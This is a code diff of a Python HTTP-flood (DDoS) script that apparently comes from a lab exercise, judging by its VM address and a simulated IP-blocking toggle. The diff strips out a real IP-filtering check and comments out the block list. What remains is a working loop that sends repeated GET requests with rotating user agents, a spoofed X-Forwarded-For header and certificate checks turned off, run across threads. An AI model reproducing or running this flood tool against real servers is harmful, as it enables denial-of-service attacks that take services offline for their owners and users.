@@ -5,13 +5,12 @@ import random
 import urllib3
 from datetime import datetime, timedelta
 import time
-import ipaddress
 
 urllib3.disable_warnings()
 
 # Fake IP address, but this doesn't make us anonymous
 fake_ip = '192.168.1.100'
-ip_add = '10.0.2.15'
+vm_ip = '10.0.2.15'
 
 # Global variables to track rate limiting
 last_request_time = datetime.min
@@ -30,10 +29,10 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26"
 ]
 
-blocked_ips = [
+'''blocked_ips = [
     "10.0.2.15",
     "192.168.1.100"
-]
+]'''
 
 
 def show_logs():
@@ -64,50 +63,31 @@ def rate_limiting():
         last_request_time = datetime.now()
 
 
-def ip_filtering(ip_address, block_for_testing=False):
+def ip_filtering(ip_address, block_for_testing):
     # Checks if an IP address is in the blocked list.
-    # Set block_for_testing to True for testing w/ protection, False otherwise
 
-    # Only check for blocking if not testing with protection
-    if block_for_testing:
-        try:
-            # Parse IP address
-            ip = ipaddress.ip_address(ip_address)
-            for blocked_range in blocked_ips:
-                blocked_network = ipaddress.ip_network(blocked_range)
-                if ip in blocked_network:
-                    return True  # IP is blocked
-            return False  # IP is not in the blocked list
-        except ValueError:
-            print(f"Invalid IP address: {ip_address}")
-            # Treat invalid IPs as blocked
-            return True
-    else:
-        # Always block for Testing purposes
-        return True
+    if block_for_testing and ip_address == vm_ip:
+        print(f"Simulating blocking IP address: {ip_address}")
+        return True  # IP is blocked
 
 
 def http_flood(target_url, num_of_requests):
-    # Get the client's IP address
-    client_ip = requests.get('https://api.ipify.org').text
-
-    # Check if the client's IP is blocked
-    if ip_filtering(client_ip):
-        print(f"Blocking request from suspicious IP: {client_ip}")
-        return
-
     # Flood the webpage with requests
     for _ in range(num_of_requests):
         try:
             # Randomly select a user-agent string
             user_agent = random.choice(user_agents)
 
-            # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
-            # Send HTTP Get request with random user agent
-            send_request = requests.get(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
-                                        verify=False)
-            print(f"Request status: {send_request.status_code}")
-            print()
+            # Set block_for_testing to True for testing w/ protection and False otherwise
+            if not ip_filtering(vm_ip, block_for_testing=False):
+                # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
+                # Send HTTP Get request with random user agent
+                send_request = requests.get(target_url, headers={'User-Agent': user_agent, 'X-Forwarded-For': fake_ip},
+                                            verify=False)
+                print(f"Request status: {send_request.status_code}")
+                print()
+            else:
+                print(f"Attack request from {vm_ip} blocked.")
         except Exception as e:
             print(f"Error: {str(e)}")
 
@@ -127,5 +107,5 @@ if __name__ == "__main__":
 
     for thread in threads:
         thread.join()
-
     print(f"DDoS attack finished.")
+
